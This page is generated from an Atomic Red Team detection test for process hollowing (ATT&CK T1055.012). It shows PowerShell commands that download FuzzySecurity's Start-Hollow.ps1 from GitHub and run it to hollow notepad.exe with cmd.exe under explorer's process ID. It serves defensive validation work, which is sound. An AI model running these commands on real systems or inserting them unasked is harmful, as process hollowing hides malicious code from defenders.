---
atomic_guid: "562427b4-39ef-4e8c-af88-463a78e70b9c"
title: "Process Hollowing using PowerShell"
framework: "atomic"
generated: "true"
attack_technique_id: "T1055.012"
attack_technique_name: "Process Injection: Process Hollowing"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1055.012/T1055.012.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "562427b4-39ef-4e8c-af88-463a78e70b9c"
  - "Process Hollowing using PowerShell"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Process Hollowing using PowerShell

This test uses PowerShell to create a Hollow from a PE on disk with explorer as the parent.
Credit to FuzzySecurity (https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Start-Hollow.ps1)

## Metadata

- Atomic GUID: 562427b4-39ef-4e8c-af88-463a78e70b9c
- Technique: T1055.012: Process Injection: Process Hollowing
- Platforms: windows
- Executor: powershell
- Dependency Executor: powershell
- Source Path: atomics/T1055.012/T1055.012.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1055-process_injection|T1055.012]]

## Input Arguments

### hollow_binary_path

- description: Path of the binary to hollow (executable that will run inside the sponsor)
- type: string
- default: C:\Windows\System32\cmd.exe

### parent_process_name

- description: Name of the parent process
- type: string
- default: explorer

### script_download_url

- description: Download url for Start-Hollow.ps1
- type: string
- default: https://raw.githubusercontent.com/FuzzySecurity/PowerShell-Suite/720d8fe82396faf74f2ca19a3fe99a5c262a14b9/Start-Hollow.ps1

### script_path

- description: Path to Start-Hollow.ps1
- type: path
- default: PathToAtomicsFolder\T1055.012\src\Start-Hollow.ps1

### spawnto_process_name

- description: Name of the process to spawn
- type: string
- default: notepad

### sponsor_binary_path

- description: Path of the sponsor binary (executable that will host the binary)
- type: string
- default: C:\Windows\System32\notepad.exe

## Dependencies

Start-Hollow.ps1 must be installed

### Prerequisite Check

```powershell
if (Test-Path "#{script_path}") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
try {
  iwr "#{script_download_url}" -OutFile (New-Item -Path #{script_path} -Force)
} catch {
  Write-Error $_
  Exit 1
}
```

## Executor

- name: powershell

### Command

```powershell
. "#{script_path}"
$ppid=Get-Process #{parent_process_name} | select -expand id
Start-Hollow -Sponsor "#{sponsor_binary_path}" -Hollow "#{hollow_binary_path}" -ParentPID $ppid -Verbose
```

### Cleanup

```powershell
Stop-Process -Name "#{spawnto_process_name}" -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1055.012/T1055.012.yaml)
